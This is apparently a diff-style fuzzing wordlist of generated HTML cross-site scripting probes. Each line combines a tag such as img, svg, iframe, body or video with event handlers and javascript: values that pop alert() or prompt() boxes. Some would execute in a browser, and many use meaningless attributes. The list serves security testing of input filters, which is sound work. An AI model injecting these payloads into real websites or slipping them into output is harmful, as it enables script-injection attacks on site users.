+<input Autofocus='javascript:alert(3)' Onsubmit='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<video Only='//google.com' Onkeydown='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<audio Autofocus='//google.com' Onfocus='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<audio Href='//google.com' Onclick='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<img Popover='javascript:alert(3)' Onkeydown='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<body Href='javascript:alert(3)' Onfocus='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<audio Popover='//google.com' Onfocus='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<video Only='//google.com' Onmouseover='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<svg Onmouseover='alert(1)' Style='alert(1)' Href>alert()</svg>
+<body Only='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<iframe Onblur='alert(1)' Src='alert(1)' On>alert()</iframe>
+<script Onerror='alert(1)' Src='alert(1)' Only>alert()</script>
+<img Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<video Popover='//google.com' Onfocus='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<body Popover='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<svg Onkeyup='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<body Popover='javascript:alert(3)' Onfocus='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<iframe Onchange='alert(1)' Onload='alert(1)' Popover>alert()</iframe>
+<audio Popover='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<img Autofocus='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<video Popover='//google.com' Onclick='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<svg Onclick='alert(1)' Onload='alert(1)' Popover>alert()</svg>
+<input Autoplay='javascript:alert(3)' Onmouseover='alert(3)' Onchange='alert(1)' Data-xss='prompt(1)' />
+<img Autoplay='javascript:alert(3)' Ontoggle='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<img Href='javascript:alert(3)' Onmouseover='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<script Onchange='alert(1)' Type='alert(1)' Only>alert()</script>
+<form Popover='javascript:alert(3)' Onfocus='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<video Autofocus='//google.com' Onpaste='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<svg Onload='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<body On='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<video On='//google.com' Onmouseover='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<audio Only='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<form Autoplay='javascript:alert(3)' Onfocus='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Onerror='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<iframe Onselect='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<script Onkeyup='alert(1)' Type='alert(1)' Only>alert()</script>
+<iframe Onkeyup='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<script Onblur='alert(1)' Type='alert(1)' On>alert()</script>
+<input Only='javascript:alert(3)' Onload='alert(3)' Onchange='alert(1)' Data-xss='prompt(1)' />
+<svg Onselect='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<form Autoplay='javascript:alert(3)' Onfocus='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<script Oninput='alert(1)' Src='alert(1)' On>alert()</script>
+<video Only='//google.com' Onerror='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<input Popover='javascript:alert(3)' Onerror='alert(3)' Onchange='alert(1)' Data-xss='prompt(1)' />
+<audio Popover='//google.com' Ontoggle='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<form Autoplay='javascript:alert(3)' Onchange='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<input On='javascript:alert(3)' Onselect='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<script Onfocus='alert(1)' Type='alert(1)' On>alert()</script>
+<form Autofocus='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<form On='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<input Only='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-custom='prompt(1)' />
+<svg Onsubmit='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<img Autofocus='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<img Only='javascript:alert(3)' Onsubmit='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<input On='javascript:alert(3)' Onselect='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<form Href='javascript:alert(3)' Onkeydown='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<svg Onclick='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<audio Autofocus='//google.com' Onmouseover='alert(2)' Autoplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<video Autoplay='//google.com' Onerror='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<video Popover='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<img Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<script Onerror='alert(1)' Type='alert(1)' Href>alert()</script>
+<svg Onselect='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<body Href='javascript:alert(3)' Onsubmit='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<audio Autoplay='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<video Only='//google.com' Onselect='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<form Only='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-info='prompt(1)' />
+<svg Onmouseover='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<iframe Onchange='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<audio Only='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<img Autofocus='javascript:alert(3)' Onpaste='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<audio Autoplay='//google.com' Ontoggle='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<iframe Onpaste='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<body Popover='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<form Href='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<form Popover='javascript:alert(3)' Onfocus='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<form Only='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<form Popover='javascript:alert(3)' Onpaste='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<svg Onsubmit='alert(1)' Style='alert(1)' Href>alert()</svg>
+<script Onpaste='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<iframe Onerror='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<input Href='javascript:alert(3)' Onsubmit='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<svg Oninput='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<form Autoplay='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<img On='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<audio Only='//google.com' Oninput='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<script Onpaste='alert(1)' Src='alert(1)' Popover>alert()</script>
+<iframe Onpaste='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<script Onfocus='alert(1)' Src='alert(1)' On>alert()</script>
+<audio On='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<form Autoplay='javascript:alert(3)' Onselect='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<svg Onerror='alert(1)' Style='alert(1)' Autoplay>alert()</svg>
+<iframe Onkeydown='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<body Only='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<audio On='//google.com' Oninput='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<img On='javascript:alert(3)' Onselect='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<audio Autofocus='//google.com' Onkeydown='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<svg Onsubmit='alert(1)' Style='alert(1)' Only>alert()</svg>
+<iframe Onkeyup='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<video On='//google.com' Onclick='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<script Ontoggle='alert(1)' Type='alert(1)' Popover>alert()</script>
+<svg Onsubmit='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<video Only='//google.com' Onkeydown='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<form Only='javascript:alert(3)' Onfocus='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<form Href='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<iframe Onclick='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<img Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<img Href='javascript:alert(3)' Onpaste='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<video Popover='//google.com' Onfocus='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<video On='//google.com' Onblur='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<audio Autoplay='//google.com' Onload='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<body Popover='javascript:alert(3)' Oninput='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<audio Href='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<script Onclick='alert(1)' Type='alert(1)' Href>alert()</script>
+<audio Popover='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<img Href='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<video Only='//google.com' Onblur='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<script Onsubmit='alert(1)' Src='alert(1)' Popover>alert()</script>
+<audio Autofocus='//google.com' Onfocus='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<video Autoplay='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<input Href='javascript:alert(3)' Onchange='alert(3)' Onchange='alert(1)' Data-xss='prompt(1)' />
+<body Autofocus='javascript:alert(3)' Onpaste='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<form Href='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<audio Href='//google.com' Onfocus='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<input On='javascript:alert(3)' Onchange='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<input Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<body Popover='javascript:alert(3)' Onkeydown='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<video Popover='//google.com' Onselect='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</video>
+<img Autofocus='javascript:alert(3)' Onselect='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<video On='//google.com' Onblur='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<video Autofocus='//google.com' Onkeydown='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</video>
+<body On='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<script Onkeyup='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<script Oninput='alert(1)' Type='alert(1)' On>alert()</script>
+<script Onchange='alert(1)' Src='alert(1)' Popover>alert()</script>
+<svg Onselect='alert(1)' Onmouseover='alert(1)' Autoplay>alert()</svg>
+<svg Onchange='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<script Onkeydown='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<iframe Onsubmit='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<audio Href='//google.com' Onchange='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<input On='javascript:alert(3)' Onerror='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<svg Onclick='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<input Popover='javascript:alert(3)' Onblur='alert(3)' Value='alert(1)' Data-info='prompt(1)' />
+<input Only='javascript:alert(3)' Onclick='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<svg Onmouseover='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<audio Only='//google.com' Onblur='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</audio>
+<form Autoplay='javascript:alert(3)' Onblur='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<svg Onmouseover='alert(1)' Onmouseover='alert(1)' On>alert()</svg>
+<script Onsubmit='alert(1)' Type='alert(1)' On>alert()</script>
+<audio Autofocus='//google.com' Onkeydown='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<svg Onkeydown='alert(1)' Onmouseover='alert(1)' Popover>alert()</svg>
+<audio Autoplay='//google.com' Onload='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<audio Only='//google.com' Onblur='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<script Onkeyup='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<svg Onselect='alert(1)' Onload='alert(1)' On>alert()</svg>
+<script Onkeyup='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<input Href='javascript:alert(3)' Onchange='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<svg Onerror='alert(1)' Style='alert(1)' Href>alert()</svg>
+<script Onsubmit='alert(1)' Type='alert(1)' Href>alert()</script>
+<audio Href='//google.com' Onfocus='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<input Popover='javascript:alert(3)' Onselect='alert(3)' Value='alert(1)' Data-info='prompt(1)' />
+<svg Onpaste='alert(1)' Onmouseover='alert(1)' On>alert()</svg>
+<video On='//google.com' Onload='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<video On='//google.com' Onpaste='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<video Only='//google.com' Onload='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</video>
+<video Only='//google.com' Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<form Popover='javascript:alert(3)' Ontoggle='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<script Oninput='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<script Onpaste='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<input Popover='javascript:alert(3)' Onerror='alert(3)' Value='alert(1)' Data-custom='prompt(1)' />
+<img Popover='javascript:alert(3)' Onload='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<video Only='//google.com' Onblur='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<script Onkeydown='alert(1)' Src='alert(1)' Only>alert()</script>
+<video On='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</video>
+<input On='javascript:alert(3)' Onkeyup='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<img Popover='javascript:alert(3)' Onload='alert(3)' Src='alert(1)' Data-info='prompt(1)' />
+<body Only='javascript:alert(3)' Onkeydown='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<input Popover='javascript:alert(3)' Oninput='alert(3)' Value='alert(1)' Data-xss='prompt(1)' />
+<body Autoplay='javascript:alert(3)' Onsubmit='alert(3)' Onload='alert(1)' Data-info='prompt(1)' />
+<video Autofocus='//google.com' Onchange='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<svg Onfocus='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<form On='javascript:alert(3)' Onselect='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<form Only='javascript:alert(3)' Onkeyup='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<video Autofocus='//google.com' Ontoggle='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</video>
+<audio Only='//google.com' Onerror='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<body On='javascript:alert(3)' Onchange='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<svg Onmouseover='alert(1)' Style='alert(1)' On>alert()</svg>
+<body Autoplay='javascript:alert(3)' Onkeyup='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<img Popover='javascript:alert(3)' Onpaste='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<svg Oninput='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<video Href='//google.com' Ontoggle='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<audio Only='//google.com' Onpaste='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<img Href='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<audio Autoplay='//google.com' Onfocus='alert(2)' Autoplay='alert(1)' Data-test='test'>alert(1)</audio>
+<form Only='javascript:alert(3)' Onclick='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<svg Onchange='alert(1)' Onmouseover='alert(1)' Autoplay>alert()</svg>
+<video On='//google.com' Onload='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<audio On='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-xss='test'>alert(1)</audio>
+<svg Onpaste='alert(1)' Style='alert(1)' Autoplay>alert()</svg>
+<iframe Onpaste='alert(1)' Onload='alert(1)' Popover>alert()</iframe>
+<script Onfocus='alert(1)' Src='alert(1)' Href>alert()</script>
+<iframe Onfocus='alert(1)' Onload='alert(1)' On>alert()</iframe>
+<audio Autofocus='//google.com' Onkeyup='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</audio>
+<audio Autofocus='//google.com' Onclick='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<img Href='javascript:alert(3)' Oninput='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<img Href='javascript:alert(3)' Onselect='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<form Href='javascript:alert(3)' Onsubmit='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<form Autofocus='javascript:alert(3)' Onkeydown='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<img On='javascript:alert(3)' Onblur='alert(3)' Src='alert(1)' Data-custom='prompt(1)' />
+<iframe Onkeyup='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<form On='javascript:alert(3)' Onkeyup='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<audio Href='//google.com' Onload='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<audio On='//google.com' Onmouseover='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<svg Onclick='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<svg Oninput='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<script Onblur='alert(1)' Src='alert(1)' Popover>alert()</script>
+<svg Onkeyup='alert(1)' Onload='alert(1)' Href>alert()</svg>
+<iframe Onkeyup='alert(1)' Src='alert(1)' Href>alert()</iframe>
+<body On='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<iframe Onload='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<img Autoplay='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<img Only='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-test='prompt(1)' />
+<audio Popover='//google.com' Onerror='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<svg Onerror='alert(1)' Onload='alert(1)' Only>alert()</svg>
+<input Autoplay='javascript:alert(3)' Onchange='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<form Popover='javascript:alert(3)' Onclick='alert(3)' Action='alert(1)' Data-test='prompt(1)' />
+<form Popover='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-custom='prompt(1)' />
+<iframe Onsubmit='alert(1)' Src='alert(1)' On>alert()</iframe>
+<img Popover='javascript:alert(3)' Onkeydown='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<audio Popover='//google.com' Onerror='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</audio>
+<input Only='javascript:alert(3)' Onchange='alert(3)' Onchange='alert(1)' Data-test='prompt(1)' />
+<iframe Onclick='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<iframe Onselect='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<audio On='//google.com' Onclick='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<img Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<form Href='javascript:alert(3)' Onfocus='alert(3)' Action='alert(1)' Data-info='prompt(1)' />
+<video Autofocus='//google.com' Onblur='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</video>
+<video Popover='//google.com' Onselect='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<video Autofocus='//google.com' Oninput='alert(2)' Autoplay='alert(1)' Data-xss='test'>alert(1)</video>
+<input Popover='javascript:alert(3)' Onclick='alert(3)' Onfocus='alert(1)' Data-xss='prompt(1)' />
+<img Only='javascript:alert(3)' Onfocus='alert(3)' Alt='alert(1)' Data-xss='prompt(1)' />
+<svg Onerror='alert(1)' Style='alert(1)' On>alert()</svg>
+<script Onclick='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<img On='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<body Href='javascript:alert(3)' Onblur='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<iframe Onblur='alert(1)' Onload='alert(1)' Popover>alert()</iframe>
+<body On='javascript:alert(3)' Onselect='alert(3)' Onload='alert(1)' Data-custom='prompt(1)' />
+<img Autofocus='javascript:alert(3)' Ontoggle='alert(3)' Alt='alert(1)' Data-custom='prompt(1)' />
+<input Popover='javascript:alert(3)' Onkeydown='alert(3)' Onfocus='alert(1)' Data-test='prompt(1)' />
+<iframe Onfocus='alert(1)' Src='alert(1)' Autoplay>alert()</iframe>
+<body Autofocus='javascript:alert(3)' Onmouseover='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<video On='//google.com' Onmouseover='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</video>
+<input Only='javascript:alert(3)' Onblur='alert(3)' Onfocus='alert(1)' Data-info='prompt(1)' />
+<body Href='javascript:alert(3)' Onerror='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<audio On='//google.com' Oninput='alert(2)' Src='alert(1)' Data-info='test'>alert(1)</audio>
+<img Autofocus='javascript:alert(3)' Onload='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<form Href='javascript:alert(3)' Onmouseover='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<iframe Onsubmit='alert(1)' Src='alert(1)' On>alert()</iframe>
+<iframe Onblur='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<svg Oninput='alert(1)' Onmouseover='alert(1)' Href>alert()</svg>
+<form Autofocus='javascript:alert(3)' Onmouseover='alert(3)' Action='alert(1)' Data-custom='prompt(1)' />
+<script Onerror='alert(1)' Type='alert(1)' Autoplay>alert()</script>
+<img Href='javascript:alert(3)' Oninput='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<form Href='javascript:alert(3)' Onsubmit='alert(3)' Onsubmit='alert(1)' Data-xss='prompt(1)' />
+<body Popover='javascript:alert(3)' Onload='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<body Only='javascript:alert(3)' Onblur='alert(3)' Onload='alert(1)' Data-xss='prompt(1)' />
+<iframe Onblur='alert(1)' Src='alert(1)' On>alert()</iframe>
+<img Only='javascript:alert(3)' Onerror='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<iframe Ontoggle='alert(1)' Onload='alert(1)' Autoplay>alert()</iframe>
+<script Onmouseover='alert(1)' Src='alert(1)' Href>alert()</script>
+<audio Autofocus='//google.com' Onerror='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</audio>
+<audio Popover='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-test='test'>alert(1)</audio>
+<svg Onclick='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<form Only='javascript:alert(3)' Onblur='alert(3)' Action='alert(1)' Data-xss='prompt(1)' />
+<iframe Onkeydown='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<iframe Onkeyup='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<body Only='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-info='prompt(1)' />
+<svg Onkeydown='alert(1)' Style='alert(1)' Popover>alert()</svg>
+<script Onchange='alert(1)' Src='alert(1)' Popover>alert()</script>
+<script Ontoggle='alert(1)' Type='alert(1)' Popover>alert()</script>
+<video On='//google.com' Onblur='alert(2)' Onplay='alert(1)' Data-custom='test'>alert(1)</video>
+<body Autoplay='javascript:alert(3)' Onchange='alert(3)' Onerror='alert(1)' Data-custom='prompt(1)' />
+<video Only='//google.com' Onsubmit='alert(2)' Src='alert(1)' Data-custom='test'>alert(1)</video>
+<script Onsubmit='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<iframe Onerror='alert(1)' Onload='alert(1)' Autofocus>alert()</iframe>
+<img Popover='javascript:alert(3)' Ontoggle='alert(3)' Alt='alert(1)' Data-info='prompt(1)' />
+<video On='//google.com' Onload='alert(2)' Onplay='alert(1)' Data-info='test'>alert(1)</video>
+<iframe Oninput='alert(1)' Onload='alert(1)' Only>alert()</iframe>
+<script Onload='alert(1)' Src='alert(1)' Autofocus>alert()</script>
+<form On='javascript:alert(3)' Ontoggle='alert(3)' Onsubmit='alert(1)' Data-test='prompt(1)' />
+<iframe Onkeydown='alert(1)' Src='alert(1)' On>alert()</iframe>
+<script Onchange='alert(1)' Type='alert(1)' Autofocus>alert()</script>
+<img Href='javascript:alert(3)' Onkeydown='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<svg Onkeydown='alert(1)' Onmouseover='alert(1)' On>alert()</svg>
+<svg Onkeyup='alert(1)' Onmouseover='alert(1)' Autoplay>alert()</svg>
+<svg Onchange='alert(1)' Onmouseover='alert(1)' Only>alert()</svg>
+<iframe Onblur='alert(1)' Src='alert(1)' Only>alert()</iframe>
+<audio Autoplay='//google.com' Onfocus='alert(2)' Onplay='alert(1)' Data-xss='test'>alert(1)</audio>
+<iframe Onmouseover='alert(1)' Src='alert(1)' Autofocus>alert()</iframe>
+<img Popover='javascript:alert(3)' Onclick='alert(3)' Alt='alert(1)' Data-test='prompt(1)' />
+<svg Oninput='alert(1)' Style='alert(1)' Autofocus>alert()</svg>
+<audio Only='//google.com' Onfocus='alert(2)' Onplay='alert(1)' Data-test='test'>alert(1)</audio>
+<body Popover='javascript:alert(3)' Ontoggle='alert(3)' Onload='alert(1)' Data-test='prompt(1)' />
+<input Href='javascript:alert(3)' Onload='alert(3)' Onchange='alert(1)' Data-info='prompt(1)' />
+<svg Onerror='alert(1)' Onmouseover='alert(1)' Autofocus>alert()</svg>
+<script Oninput='alert(1)' Src='alert(1)' On>alert()</script>
+<body Autofocus='javascript:alert(3)' Onkeyup='alert(3)' Onerror='alert(1)' Data-xss='prompt(1)' />
+<iframe Onchange='alert(1)' Src='alert(1)' Popover>alert()</iframe>
+<audio Href='//google.com' Ontoggle='alert(2)' Autoplay='alert(1)' Data-info='test'>alert(1)</audio>
+<img Href='javascript:alert(3)' Oninput='alert(3)' Src='alert(1)' Data-test='prompt(1)' />
+<script Ontoggle='alert(1)' Type='alert(1)' Only>alert()</script>
+<script Onmouseover='alert(1)' Src='alert(1)' Autoplay>alert()</script>
+<img Autoplay='javascript:alert(3)' Onfocus='alert(3)' Src='alert(1)' Data-xss='prompt(1)' />
+<script Onblur='alert(1)' Src='alert(1)' Only>alert()</script>
